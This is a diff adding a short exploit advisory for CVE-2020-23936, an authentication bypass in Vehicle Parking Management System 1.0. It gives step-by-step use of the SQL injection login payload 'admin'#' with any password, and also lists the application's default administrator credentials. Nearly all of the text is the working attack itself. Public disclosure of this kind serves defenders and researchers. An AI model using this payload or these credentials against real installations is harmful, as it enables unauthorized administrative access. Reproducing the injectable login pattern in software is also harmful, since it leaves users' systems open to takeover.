@@ -1,0 +1,17 @@
+# Exploit Title: Vehicle Parking Management System 1.0 - Authentication Bypass
+# Date: 2020-07-06
+# Exploit Author: Enes Özeser
+# Vendor Homepage: https://phpgurukul.com/vehicle-parking-management-system-using-php-and-mysql/
+# Version: 1.0
+# Tested on: Windows & WampServer
+# CVE: CVE-2020-23936
+
+1- Go to following url. >> http://(HOST)/index.php
+2- We can login succesfully with SQL bypass method. 
+
+-- Username = admin'#
+-- Password = (Write Something)
+
+(( NOTE: Default username and password is admin:Test@123 ))
+
+
